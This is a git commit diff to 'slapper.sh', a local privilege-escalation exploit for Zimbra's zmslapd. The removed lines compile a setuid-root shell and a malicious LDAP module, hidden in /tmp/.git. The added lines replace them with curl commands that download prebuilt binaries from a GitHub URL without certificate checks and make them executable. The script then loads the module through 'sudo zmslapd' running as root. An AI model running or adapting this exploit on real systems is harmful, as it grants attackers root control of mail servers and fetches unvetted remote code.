41f12c8d51922731f55ff0414d62347834509bf2
0xbadad <aels@users.noreply.github.com>
2022-08-20 16:11:44 +0300

    Update slapper.sh

--- slapper.sh
+++ slapper.sh
@@ -3,43 +3,22 @@ echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
 echo "[+] Setting up..."
 mkdir /tmp/.git
 cd /tmp/.git
-cat << EOF > /tmp/.git/sorrymom.c
-#include <stdio.h>
-#include <sys/types.h>
-#include <unistd.h>
-__attribute__ ((__constructor__))
-void dropshell(void){
-    chown("/tmp/.git/init", 0, 0);
-    chmod("/tmp/.git/init", 04755);
-    printf("[+] done!\n");
-}
-EOF
-cat << EOF > /tmp/.git/init.c
-#include <stdio.h>
-int main(void){
-    setuid(0);
-    setgid(0);
-    seteuid(0);
-    setegid(0);
-    execvp("/bin/bash", NULL, NULL);
-}
-EOF
-export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
-gcc -static -o /tmp/.git/init /tmp/.git/init.c 2>&1
-rm -rf /tmp/.git/init.c
-gcc -fPIC -shared -ldl -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c 2>&1
-rm -rf /tmp/.git/sorrymom.c
+
+curl -sfkSL https://raw.githubusercontent.com/aels/zimbra-slapper/main/init > init
+chmod +x init
+curl -sfkSL https://raw.githubusercontent.com/aels/zimbra-slapper/main/sorrymom.so > sorrymom.so
+chmod +x sorrymom.so
 cat << EOF > /tmp/.git/slapd.conf
-include		/opt/zimbra/common/etc/openldap/schema/core.schema
-modulepath	/tmp/.git
-moduleload	sorrymom.so
-database	mdb
-maxsize		1073741824
-suffix		"dc=my-domain,dc=com"
-rootdn		"cn=Manager,dc=my-domain,dc=com"
-rootpw		secret
-directory	/opt/zimbra/data/ldap/state/openldap-data
-index	    objectClass	eq
+include     /opt/zimbra/common/etc/openldap/schema/core.schema
+modulepath  /tmp/.git
+moduleload  sorrymom.so
+database    mdb
+maxsize     1073741824
+suffix      "dc=my-domain,dc=com"
+rootdn      "cn=Manager,dc=my-domain,dc=com"
+rootpw      secret
+directory   /opt/zimbra/data/ldap/state/openldap-data
+index       objectClass eq
 EOF
 echo "[+] Triggering our exploit..."
 sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.git/slapd.conf
